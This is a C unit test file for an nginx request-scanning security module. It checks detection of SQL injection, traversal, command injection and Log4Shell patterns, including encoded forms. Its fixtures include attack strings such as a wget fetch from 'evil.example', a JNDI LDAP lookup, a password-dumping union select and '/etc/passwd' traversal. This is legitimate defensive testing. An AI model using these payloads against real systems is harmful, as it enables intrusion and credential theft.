/*
 * Copyright (C) 2026 Thijs Eilander
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Unit tests for the scan core (src/ngx_http_shield_scan.c).
 *
 * WHY THIS EXISTS ALONGSIDE ci/t/ AND ci/fuzz/
 *
 *   ci/t, Test::Nginx    drives the module through a live nginx. It proves the
 *                        request plumbing, but every case has to arrive as an
 *                        HTTP request, so a per-category skip mask or the
 *                        MATCH_RAW/MATCH_DECODED split is awkward to isolate.
 *   ci/fuzz/fuzz_scan.c  drives the same code with random bytes. It proves the
 *                        core does not CRASH, but a fuzzer asserts invariants,
 *                        not VALUES -- "this exact skip bit disables this exact
 *                        category" is not something it can state.
 *   this file            states values, at named boundaries, with no nginx
 *                        process and no network, in well under a second.
 *
 * It links the REAL src/ngx_http_shield_scan.c and the REAL nginx
 * src/core/ngx_string.c, src/core/ngx_palloc.c, src/os/unix/ngx_alloc.c (via
 * ci/tests/unit/run.sh), exactly as ci/fuzz/build.sh does for fuzz_scan. There
 * is deliberately NO shim reimplementation of ngx_unescape_uri() or
 * ngx_strlow(): the decoder is the thing most likely to disagree with what
 * nginx actually serves, and a test that asserts against a private copy of it
 * would assert only that the copy is self-consistent, which is worth nothing.
 *
 * ngx_http_shield_ac_build() needs a real ngx_pool_t (it calls ngx_pcalloc()
 * for the permanent tables and ngx_create_pool()/ngx_destroy_pool() for build
 * scratch), which is why ngx_palloc.c/ngx_alloc.c are linked rather than
 * stubbed -- there is no allocator seam to stub here the way ci/fuzz/'s
 * skeleton-derived cousin stubs logging for a hermetic scan core.
 *
 * PORTABILITY: keep every case free of host assumptions -- no sizeof-dependent
 * expected values, no signed-char comparisons, no pointer-width arithmetic in
 * an expectation. This is a CONVENTION, not something CI enforces: every job
 * in this repo runs amd64, where size_t is 8 bytes and char is signed.
 *
 * Extend: add a CASE() function and one line in main(). Keep each case
 * asserting a value the CORRECT implementation produces and a BROKEN one does
 * not -- ci/tests/unit/run.sh's header lists the mutations every case here was
 * seen red against.
 */

#include "ngx_http_shield_scan.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


static int  failures;
static int  checks;


static void
check(int ok, const char *what)
{
    checks++;
    if (ok) {
        printf("ok   %s\n", what);
        return;
    }
    printf("FAIL %s\n", what);
    failures++;
}


/* A real ngx_log_t writing nowhere -- ngx_create_pool()/ngx_palloc() require
 * one, and ngx_http_shield_ac_build() logs to it on a build failure. Output is
 * discarded by the ngx_log_error_core() stub below. */
static ngx_log_t  test_log;

/*
 * Referenced by ngx_palloc.c's allocation-failure path and by
 * ngx_http_shield_ac_build()'s own ngx_log_error() calls. Mirrors
 * ci/fuzz/fuzz_scan.c's stub exactly: output is DISCARDED here, because the
 * loud failure path in this file is build_automata()'s abort() on
 * ngx_http_shield_ac_build() returning NGX_ERROR -- aborting inside the log
 * stub itself would turn every nginx-internal error log into a crash, which
 * is a wider contract than this harness wants.
 */
void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, ...)
{
    (void) level; (void) log; (void) err; (void) fmt;
}

/*
 * ngx_string.c's ngx_sort() references ngx_cycle; nothing this file calls
 * reaches ngx_sort(), so the symbol only needs to exist to satisfy the
 * linker. Same stub as ci/fuzz/fuzz_scan.c.
 */
volatile ngx_cycle_t  *ngx_cycle;


/*
 * Build both production automata into a fresh pool, exactly as
 * ngx_http_shield_init() does at postconfiguration. Every case in this file
 * scans through these two automata -- there is no per-case rebuild, matching
 * how the module builds them once per nginx worker cycle.
 */
static void
build_automata(void)
{
    ngx_pool_t  *pool;

    pool = ngx_create_pool(NGX_DEFAULT_POOL_SIZE, &test_log);
    if (pool == NULL) {
        fprintf(stderr, "ngx_create_pool failed\n");
        abort();
    }

    if (ngx_http_shield_ac_build(pool, &test_log, &ngx_http_shield_ac_decoded,
                                  NGX_HTTP_SHIELD_MATCH_DECODED)
        != NGX_OK)
    {
        fprintf(stderr, "ac_build(DECODED) failed\n");
        abort();
    }

    if (ngx_http_shield_ac_build(pool, &test_log, &ngx_http_shield_ac_raw,
                                  NGX_HTTP_SHIELD_MATCH_RAW)
        != NGX_OK)
    {
        fprintf(stderr, "ac_build(RAW) failed\n");
        abort();
    }

    /* Deliberately never destroyed: the automata point into this pool and
     * must outlive every case in main(), same as the production cf->pool. */
}


/*
 * Scan a NUL-terminated C literal with the given skip mask. The core takes
 * (u_char *, len) and never looks for a terminator, so the length is the
 * string length -- never sizeof(), which would feed the NUL in as a scanned
 * byte and quietly change what the decoder sees at the end of the buffer.
 *
 * Scratch buffers are allocated exactly `len` bytes each, matching the
 * production call site's contract (ngx_http_shield_module.c allocates
 * scratch_lc/scratch_dec at exactly `len` from r->pool) -- a decoder that
 * ever wrote past `len` corrupts the adjacent malloc chunk here rather than
 * merely a private, oversized test buffer, so this harness can actually catch
 * that class of bug instead of silently absorbing it.
 */
static ngx_int_t
scan_str_skip(const char *s, uint64_t skip, ngx_http_shield_hit_t *hit)
{
    u_char                  *buf, *lc, *dec;
    size_t                   n;
    ngx_int_t                rc;
    ngx_http_shield_hit_t    local_hit;

    /* Poisoned on every call, whether or not this scan reports a match: a
     * caller that reads hit.cat/hit.category after a mutated scan_input()
     * that wrongly returns NGX_DECLINED (or any other path that skips
     * filling *hit) gets a deterministic, out-of-range sentinel instead of
     * a stack-garbage pointer -- the difference between a test that FAILs
     * cleanly and one that either segfaults inside libc's strcmp() or, worse,
     * silently PASSES a hit.cat check because the poison happens to alias a
     * real category's enum value (memset-to-zero would alias
     * NGX_HTTP_SHIELD_CAT_SQLI == 0, exactly the category most of this file's
     * fixtures target). NGX_HTTP_SHIELD_CAT_N is one past the last real
     * category and can never equal a genuine hit. */
    if (hit != NULL) {
        memset(hit, 0xff, sizeof(*hit));
        hit->cat = NGX_HTTP_SHIELD_CAT_N;
        hit->category = NULL;
    }

    n = strlen(s);

    if (n == 0) {
        /* scan_input returns NGX_DECLINED for len == 0 before touching the
         * scratch pointers at all, so NULL is safe and malloc(0) is avoided
         * (its behaviour is implementation-defined). */
        return ngx_http_shield_scan_input(NULL, 0, NULL, NULL, "test", skip,
                                           hit != NULL ? hit : &local_hit);
    }

    buf = malloc(n);
    lc = malloc(n);
    dec = malloc(n);
    if (buf == NULL || lc == NULL || dec == NULL) {
        fprintf(stderr, "scan_str_skip: OOM\n");
        abort();
    }
    memcpy(buf, s, n);

    rc = ngx_http_shield_scan_input(buf, n, lc, dec, "test", skip,
                                     hit != NULL ? hit : &local_hit);

    free(buf);
    free(lc);
    free(dec);

    return rc;
}


static ngx_int_t
scan_str(const char *s, ngx_http_shield_hit_t *hit)
{
    return scan_str_skip(s, 0, hit);
}


/* --- cases ---------------------------------------------------------------- */

/*
 * The CLEAN baseline. This is the case that gives every other case in this
 * file meaning: a scanner that returned NGX_OK unconditionally would pass
 * every positive-hit case below, but it fails here.
 */
static void
case_clean_baseline(void)
{
    ngx_http_shield_hit_t  hit;

    check(ngx_http_shield_scan_input(NULL, 0, NULL, NULL, "test", 0, &hit)
              == NGX_DECLINED,
          "(NULL, 0, ...) is declined, not a crash");

    check(scan_str("", &hit) == NGX_DECLINED, "empty input is declined");

    check(scan_str("hello world, this is an ordinary GET request path",
                    &hit)
              == NGX_DECLINED,
          "benign prose is declined");

    check(scan_str("/products/widget?color=blue&size=large", &hit)
              == NGX_DECLINED,
          "benign query string is declined");
}


/*
 * One positive hit per representative category, proving the automaton
 * actually reports the category it matched (hit.cat / hit.category) rather
 * than merely returning "some" verdict.
 */
static void
case_category_hits(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("id=1 union select username,password from users", &hit)
              == NGX_OK,
          "sqli signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI, "sqli hit reports CAT_SQLI");
    check(hit.category != NULL && strcmp(hit.category, "sqli") == 0,
          "sqli hit reports name \"sqli\"");

    check(scan_str("/download?file=../../../../etc/passwd", &hit) == NGX_OK,
          "traversal signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_TRAVERSAL,
          "traversal hit reports CAT_TRAVERSAL");

    check(scan_str(";wget http://evil.example/x.sh", &hit) == NGX_OK,
          "cmdi signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_CMDI, "cmdi hit reports CAT_CMDI");

    check(scan_str("payload=${jndi:ldap://evil.example/a}", &hit) == NGX_OK,
          "template (Log4Shell) signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_TEMPLATE,
          "template hit reports CAT_TEMPLATE");

    check(scan_str("/etc/passwd", &hit) == NGX_OK,
          "sensitive_file signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SENSITIVE_FILE,
          "sensitive_file hit reports CAT_SENSITIVE_FILE");
}


/*
 * Percent-decoding: the whole reason the decoder is production code rather
 * than a raw substring pass. Each of these would be missed by scanning the
 * still-encoded bytes, which is precisely the bypass the decode stage exists
 * to close.
 */
static void
case_percent_decoding(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("id=1%20union%20select%20user%2cpass%20from%20users",
                    &hit)
              == NGX_OK,
          "fully percent-encoded sqli marker matches after one decode");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "decoded sqli hit still reports CAT_SQLI");

    check(scan_str("file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", &hit) == NGX_OK,
          "percent-encoded traversal matches after one decode");

    /* Double-encoding is NOT decoded twice, and must not be: nginx decodes
     * once, so a module that decoded twice would match strings the server
     * itself never sees in that form -- a false positive and a divergence
     * from the bytes actually served. "%2575nion" decodes ONE level to the
     * literal text "%75nion", which contains neither "union select" (the
     * literal percent-escape is still in the way) nor any RAW-matched
     * signature, so the request must stay clean. */
    check(scan_str("id=1%2575nion%2520select%25201%252c1", &hit)
              == NGX_DECLINED,
          "double-encoded sqli marker does NOT match (single decode, "
          "like nginx)");

    /* nullbyte/overlong are matched against the RAW (still-encoded) buffer on
     * purpose -- see MATCH_RAW in ngx_http_shield_patterns.h. */
    check(scan_str("file=report.pdf%00.php", &hit) == NGX_OK,
          "encoded NUL matches against the raw buffer");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_NULLBYTE,
          "encoded-NUL hit reports CAT_NULLBYTE");

    check(scan_str("path=%c0%af%c0%aeetc", &hit) == NGX_OK,
          "overlong-UTF-8 traversal matches against the raw buffer");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_OVERLONG,
          "overlong hit reports CAT_OVERLONG");

    /* '+' folds to a literal space before the decoded scan, matching nginx's
     * own application/x-www-form-urlencoded convention. "or+1=1--" only forms
     * the sqli signature "or 1=1--" (space-separated) once the '+' becomes a
     * space; left as a literal '+' it is not a signature at all in either
     * form ("or+1=1--" is not listed). */
    check(scan_str("id=x' or+1=1--", &hit) == NGX_OK,
          "'+' folds to a literal space, completing the sqli signature");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "'+'-folded sqli hit reports CAT_SQLI");
}


/*
 * shield_skip disables exactly the named category and nothing else: the same
 * input that matches with skip == 0 must go clean with that category's bit
 * set, and an UNRELATED category's bit must not affect it at all.
 */
static void
case_skip_mask(void)
{
    uint64_t                skip_sqli, skip_xss;
    ngx_http_shield_hit_t   hit;

    skip_sqli = (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_SQLI;
    skip_xss = (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_XSS;

    check(scan_str_skip("union select password from users", 0, &hit)
              == NGX_OK,
          "sqli matches with an empty skip mask");

    check(scan_str_skip("union select password from users", skip_sqli, &hit)
              == NGX_DECLINED,
          "skipping CAT_SQLI makes the same sqli input clean");

    check(scan_str_skip("union select password from users", skip_xss, &hit)
              == NGX_OK,
          "skipping an UNRELATED category (xss) leaves sqli matching");
}


/*
 * Case folding: scratch_lc is a full lowercase copy of the RAW bytes, and the
 * decoded copy is lowercased too (ngx_strlow(dec, dec, dlen) after decode).
 * Mixed case must fold byte-for-byte, not merely "look close".
 */
static void
case_case_folding(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("UNION SELECT password FROM users", &hit) == NGX_OK,
          "uppercase sqli marker matches (folded before match)");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "uppercase sqli hit still reports CAT_SQLI");

    check(scan_str("UnIoN SeLeCt PaSsWoRd FrOm users", &hit) == NGX_OK,
          "mixed-case sqli marker matches");

    /* RAW-matched categories fold too: raw_lc is ngx_strlow(data), so an
     * uppercased percent-escape digit must still hit nullbyte. Percent-escape
     * hex digits are conventionally uppercase in the wild ("%00" vs "%00" is
     * the same either way for digits, so use the overlong category, whose
     * signature contains lowercase hex LETTERS that only match if folded). */
    check(scan_str("path=%C0%AF%C0%AEetc", &hit) == NGX_OK,
          "uppercase-hex overlong escape matches (raw copy folded too)");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_OVERLONG,
          "folded overlong hit still reports CAT_OVERLONG");
}


/*
 * NUL bytes and malformed/truncated percent-escapes inside the buffer must
 * not crash or desynchronize the scan -- there is no length cap here (unlike
 * the skeleton's NGX_HTTP_SKEL_SCAN_MAX): the caller passes an exact byte
 * count and the decoder must honour exactly that many bytes, including an
 * embedded NUL that is not a C string terminator at all.
 */
static void
case_malformed_and_embedded_nul(void)
{
    static const u_char     embedded[] = "a\0b union select c";
    /* strlen() would stop at the embedded NUL; the true length is
     * sizeof(embedded) - 1 (drop the C string's own trailing NUL). */
    size_t                   elen = sizeof(embedded) - 1;
    u_char                  *buf, *lc, *dec;
    ngx_http_shield_hit_t    hit;
    ngx_int_t                rc;

    memset(&hit, 0xff, sizeof(hit));
    hit.cat = NGX_HTTP_SHIELD_CAT_N;
    hit.category = NULL;

    buf = malloc(elen);
    lc = malloc(elen);
    dec = malloc(elen);
    if (buf == NULL || lc == NULL || dec == NULL) {
        fprintf(stderr, "case_malformed_and_embedded_nul: OOM\n");
        abort();
    }
    memcpy(buf, embedded, elen);

    rc = ngx_http_shield_scan_input(buf, elen, lc, dec, "test", 0, &hit);
    check(rc == NGX_OK,
          "a literal embedded NUL does not truncate the scan -- the sqli "
          "marker AFTER it still matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "embedded-NUL scan still reports the correct category");

    free(buf);
    free(lc);
    free(dec);

    /* A truncated percent-escape at the very end of the buffer ("%2" with no
     * second hex digit, or a bare trailing "%") must decode to *something*
     * deterministic rather than reading past the buffer. ngx_unescape_uri()
     * treats an incomplete escape as literal trailing bytes; the point of
     * this check is that the call returns cleanly with no signature firing
     * from garbage past the end. */
    check(scan_str("plain text ending in a bare percent %", &hit)
              == NGX_DECLINED,
          "a trailing bare '%' does not crash and stays clean");
    check(scan_str("plain text ending in a truncated escape %2", &hit)
              == NGX_DECLINED,
          "a trailing truncated escape ('%2', one hex digit) does not crash "
          "and stays clean");
}


/*
 * The raw-vs-decoded automaton split (MATCH_RAW vs MATCH_DECODED) is a
 * behavioural property, not an implementation detail: overlong is RAW-only,
 * so its ENCODED form must match while the same bytes, once decoded to a
 * literal '/', must NOT re-trigger overlong (there is no bare-slash
 * signature in that category -- only the specific overlong escapes are
 * listed) -- proving the raw scan and the decoded scan are genuinely
 * different passes over different buffers, not one pass reused twice.
 */
static void
case_raw_vs_decoded_split(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("path=%c0%af%c0%aeetc", &hit) == NGX_OK,
          "overlong signature matches the RAW (still-encoded) buffer");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_OVERLONG,
          "overlong hit is reported, confirming the RAW automaton fired");

    /* Same semantic path (a traversal to /etc), spelled as a literal decoded
     * slash+dot instead of the overlong escapes: this must be caught by
     * ordinary traversal/sensitive_file matching on the DECODED buffer, not
     * by overlong -- overlong has no bare "/." signature. */
    check(scan_str("path=/./etc", &hit) == NGX_DECLINED,
          "the literal (non-overlong) spelling of the same path does not "
          "trigger overlong -- it has no bare '/.' signature");

    /* A DECODED-only category (sqli) must NOT be reachable through the RAW
     * automaton: percent-encoding a sqli marker so it never survives to the
     * decoded buffer as the marker (double-encoded, see case_percent_
     * decoding) proves the raw automaton does not carry sqli's signature set
     * at all -- if it did, the raw copy of the still-doubly-encoded text
     * could accidentally alias a signature. Re-asserted here from the split
     * angle: the raw buffer for a CLEAN plain-text sqli-shaped string must
     * not be scanned against decoded-only tables either. */
    check(scan_str("this text merely discusses union select syntax", &hit)
              == NGX_OK,
          "sanity: sqli terms in plain lowercase text still match "
          "decoded -- establishes the baseline case_raw_vs_decoded relies on");
}


int
main(void)
{
    build_automata();

    case_clean_baseline();
    case_category_hits();
    case_percent_decoding();
    case_skip_mask();
    case_case_folding();
    case_malformed_and_embedded_nul();
    case_raw_vs_decoded_split();

    printf("\n%d check(s), %d failure(s)\n", checks, failures);

    /* A run that asserted NOTHING is a failure, not a pass: the whole point
     * of this binary is that it cannot go green by doing nothing. */
    if (checks == 0) {
        printf("FAIL: no checks ran\n");
        return 1;
    }

    return failures ? 1 : 0;
}
